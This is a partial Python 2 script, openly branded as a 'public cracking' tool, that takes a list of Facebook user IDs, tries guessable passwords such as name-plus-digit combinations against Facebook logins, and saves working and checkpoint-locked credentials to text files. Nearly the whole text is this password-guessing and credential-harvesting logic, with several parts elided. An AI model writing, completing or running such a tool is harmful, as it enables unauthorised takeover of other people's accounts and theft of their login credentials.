...
def a_s():
    ...
    if a_s == '1':
        os.system('clear')
        print logo
        print '\x1b[1;93m~~~~ Asad Ansaari public cracking ~~~~\x1b[1;91m'
        print 47 * '-'
        ...
        p5 = raw_input(' \x1b[1;92m[4]Name + digit: ')
        p6 = raw_input(' \x1b[1;92m[4]Name + digit: ')
        p7 = raw_input(' \x1b[1;92m[4]Name + digit: ')
        p8 = raw_input(' \x1b[1;92m[4]Name + digit: ')
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;94mASAD ANSAARI OFFICIAL King Of Facebook\x1b[1;91m'
    print 47 * '-'
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;92m[A❤️S-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;31;1m[A❤️S-CP] ' + uid + ' | ' + pass1
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[A❤️S-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;31;1m[A❤️S-CP] ' + uid + ' | ' + pass2
                    cp = open('HOP_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[A❤️S-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;31;1m[A❤️S-CP] ' + uid + ' | ' + pass3
                        cp = open('HOP_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[A❤️S-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;31;1m[A❤️S-CP] ' + uid + ' | ' + pass4
                            cp = open('HOP_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
...
def c_s():
    ...
    if a_s == '1':
        ...
        pass3 = raw_input(' \x1b[1;92m[3]Password: ')
        pass4 = raw_input(' \x1b[1;92m[4]Password: ')
        pass5 = raw_input(' \x1b[1;92m[4]Password: ')
        pass6 = raw_input(' \x1b[1;92m[4]Password: ')
        pass7 = raw_input(' \x1b[1;92m[4]Password: ')
        pass8 = raw_input(' \x1b[1;92m[4]Password: ')
        ...
        print 47 * '-'
        print '\x1b[1;93m For example:first_last,firstlast,first786,last786\x1b[1;91m'
        print 47 * '-'
        pass1 = raw_input(' \x1b[1;92m[1]Password: ')
        pass2 = raw_input(' \x1b[1;92m[2]Password: ')
        pass3 = raw_input(' \x1b[1;92m[3]Password: ')
        pass4 = raw_input(' \x1b[1;92m[4]Password: ')
        pass5 = raw_input(' \x1b[1;92m[1]Password: ')
        pass6 = raw_input(' \x1b[1;92m[1]Password: ')
        pass7 = raw_input(' \x1b[1;92m[1]Password: ')    
        try:
            idlist = raw_input('[+] File Name: ')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;94mASAD ANSAARI OFFICIAL King Of Fcebook\x1b[1;91m'
    print 47 * '-'
